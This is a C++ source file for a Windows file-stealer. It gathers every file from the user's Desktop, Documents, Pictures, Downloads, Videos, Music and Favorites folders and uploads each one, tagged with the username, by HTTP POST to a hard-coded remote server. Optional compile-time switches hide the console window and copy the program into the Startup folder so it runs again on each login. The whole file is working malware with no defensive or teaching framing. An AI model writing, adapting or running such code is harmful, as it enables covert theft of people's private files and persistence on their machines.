#pragma comment(lib, "ws2_32.lib")

#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <string>
#include <iostream>
#include <filesystem>
#include <fstream>
#include <Lmcons.h>
#include <sstream>

namespace fs = std::filesystem;

#define susBehaviour false
#define stealthBehaviour false

#define SERV_PORT 8080 // The port the HTTP POST request will be sent to
const char szHost[] = "192.168.1.139"; // The IP address of the server

/* 
	returns a connected socket at the given address and port
*/
SOCKET connectToServer(const char* szHostAddress, int nPort){
	// Initialize Winsock
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
#if !stealthBehaviour
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
	}
#endif
	// Create a socket
	SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
#if !stealthBehaviour
	if (ConnectSocket == INVALID_SOCKET) {
		printf("Socket failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
	}
#endif
	// Resolve the server address and port
	struct sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	clientService.sin_addr.s_addr = inet_addr(szHostAddress);
	clientService.sin_port = htons(nPort);
	// Connect to server:
	iResult = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
#if !stealthBehaviour
	if (iResult == SOCKET_ERROR) {
		printf("Connect failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
	}
	printf("Connected to %s on port %d\n", szHostAddress, nPort);
#endif
	return ConnectSocket;
}

void sendFile(std::string path, std::string fileName){
	SOCKET s = connectToServer(szHost, SERV_PORT);
	std::fstream in(path, std::ios::in | std::ios::binary);
#if !stealthBehaviour
	if (!in.is_open()) {
		printf("Error opening file %s\n", path.c_str());
	}
#endif
	// Get the filesize of the file
	in.seekg(0, std::ios::end);
	int fileSize = in.tellg();
	in.seekg(0, std::ios::beg);

	if (fileSize < 0) {
#if !stealthBehaviour
		printf("Error getting filesize of %s\n", path.c_str());
#endif
		return;
	}
	
	// Malloc char array for the data
	char* data = (char*)malloc(fileSize * sizeof(char));

	// Read the file into the char array
	in.read(data, fileSize);


#if !stealthBehaviour
	printf("Data size: %d\n", fileSize);
#endif

	// Assemble a HTTP POST request
	// FORMAT:
	/*
		POST / HTTP/1.1
		Host: localhost:8080
		Content-Type: multipart/form-data; boundary=MY_BOUNDARY

		--MY_BOUNDARY
		Content-Disposition: form-data; name="file"; filename="myfile.txt"

		[file data]
		--MY_BOUNDARY--
	*/
	std::string request = "POST / HTTP/1.1\r\n";
	request += "Host: " + std::string(szHost) + ":" + std::to_string(SERV_PORT) + "\r\n";
	request += "Content-Type: multipart/form-data; boundary=MY_BOUNDARY\r\n\r\n";
	request += "--MY_BOUNDARY\r\n";
	request += "Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n\r\n";
	std::string endRequest = "\r\n--MY_BOUNDARY--\r\n";
	long unsigned int requestSize = (fileSize * sizeof(char)) +
									(request.size() * sizeof(char)) +
									(endRequest.size() * sizeof(char));
	
	char* requestBuffer = (char*)malloc(requestSize);
	
	for (int i = 0; i < request.size(); i++) {
		requestBuffer[i] = request[i];
	}
	for (int i = 0; i < fileSize; i++) {
		requestBuffer[i + request.size()] = data[i];
	}
	free(data);
	for (int i = 0; i < endRequest.size(); i++) {
		requestBuffer[i + request.size() + fileSize] = endRequest[i];
	}
	
	// Send the HTTP POST request
	int result = send(s, requestBuffer, requestSize, 0);
	free(requestBuffer);
#if !stealthBehaviour
	if (result == SOCKET_ERROR) {
		printf("send failed with error: %d\n", WSAGetLastError());
		return;
	}
	std::cout << "Sent file " << fileName << std::endl;
#endif
	// Wait for a response
	char responseBuffer[1024];
	recv(s, responseBuffer, 128, 0);
#if !stealthBehaviour
	printf("Response: %s\n", responseBuffer);
#endif
	// Clean up the memory and socket
	closesocket(s);
	WSACleanup();
	in.close();
	
}



void uploadFilesInFolder(fs::path p) {
	for (const auto& entry : fs::directory_iterator(p)) {
		// Check if entry is a file or a folder
		if (!entry.is_directory()) {
			// Get the username of the machine
			std::string username;
			char szUsername[UNLEN + 1];
			DWORD usernameLen = UNLEN + 1;
			GetUserName(szUsername, &usernameLen);
			username = szUsername;
#if !stealthBehaviour
			printf("Sending file %s\n", entry.path().filename().string().c_str());
#endif
			sendFile(entry.path().string(), username + "_" + entry.path().filename().string());
		}
	}
}

int main() {
#if stealthBehaviour
	ShowWindow(GetConsoleWindow(), SW_HIDE); // Stealth mode activated!
#endif // stealthBehaviour
#if susBehaviour
	// Get the path to the user's startup folder
	char szStartupPath[MAX_PATH] = { 0 };
	if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, szStartupPath))) {
		#if !stealthBehaviour
		DWORD errorCode = GetLastError();
		printf("Error: %d - %s\n", errorCode, FormatErrorMessage(errorCode));
		#endif
	}
	// Get the path to the current executable
	char szExecPath[MAX_PATH] = { 0 };
	if (!SUCCEEDED(GetModuleFileName(NULL, szExecPath, MAX_PATH))) {
		#if !stealthBehaviour
		DWORD errorCode = GetLastError();
		printf("Error: %d - %s\n", errorCode, FormatErrorMessage(errorCode));
		#endif
	}
	// Copy the executable to the startup folder
	// - First, create a string with the new path of the new file
	const char szStartupExecName[] = "a.exe";
	char szStartupExecPath[MAX_PATH];
	sprintf(szStartupExecPath, "%s\\%s", szStartupPath, szStartupExecName);
	if (!SUCCEEDED(CopyFile(szExecPath, szStartupExecPath, NULL))) {
		#if !stealthBehaviour
		DWORD errorCode = GetLastError();
		printf("Error: %d - %s\n", errorCode, FormatErrorMessage(errorCode));
		#endif
	}
	#if !stealthBehaviour
	printf("%s | %s\n", szStartupExecPath, szExecPath);
	#endif
#endif // susBehaviour

	fs::path desktopPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Desktop");
	fs::path downloadsPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Downloads");
	fs::path picturesPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Pictures");
	fs::path documentsPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Documents");
	fs::path videosPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Videos");
	fs::path musicPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Music");
	fs::path favouritesPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Favorites");
	// Start uploading stuff
	uploadFilesInFolder(desktopPath);
	uploadFilesInFolder(picturesPath);
	uploadFilesInFolder(documentsPath);
	uploadFilesInFolder(downloadsPath);
	uploadFilesInFolder(videosPath);
	uploadFilesInFolder(musicPath);
	uploadFilesInFolder(favouritesPath);
	// Done!
	// Get a char to keep the window alive
	getchar();
	ExitProcess(EXIT_SUCCESS);
}
